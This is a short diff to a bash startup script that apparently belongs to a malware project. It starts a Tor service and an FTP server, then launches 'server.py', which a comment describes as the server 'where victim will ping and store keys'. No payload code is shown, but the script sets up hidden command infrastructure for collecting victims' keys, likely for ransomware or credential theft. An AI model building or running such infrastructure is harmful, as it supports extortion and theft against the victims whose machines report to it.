@@ -1,10 +1,10 @@
 #!/bin/bash
 
-echo "SCRIPT #WEBSERVER TOR"
-
 #Execute tor service
-tor &
+service tor start
 
+#Execute FTP
+service vsftpd start
 
 #Server where victim will ping and store keys
 python server.py
